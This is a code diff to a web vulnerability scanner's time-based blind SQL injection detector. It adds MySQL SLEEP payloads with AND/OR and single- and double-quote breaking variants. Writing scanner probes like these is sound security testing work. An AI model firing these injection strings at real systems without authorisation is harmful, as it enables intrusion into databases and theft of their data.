@@ -97,8 +97,18 @@ class BlindSQLTimeDelay(object):
         # at xml/payloads/05_time_blind.xml
         #
         res.append(ExactDelay("1 AND (SELECT * FROM (SELECT(SLEEP(%s)))foo)"))
+        res.append(ExactDelay("1 OR (SELECT * FROM (SELECT(SLEEP(%s)))foo)"))
+
+        # Single and double quote string concat
         res.append(ExactDelay("'+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+'"))
         res.append(ExactDelay('"+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+"'))
+
+        # These are required, they don't cover the same case than the previous
+        # ones (string concat).
+        res.append(ExactDelay("' AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND '1'='1"))
+        res.append(ExactDelay('" AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND "1"="1'))
+        res.append(ExactDelay("' OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR '1'='2"))
+        res.append(ExactDelay('" OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR "1"="2'))
 
         # MySQL 4
         #
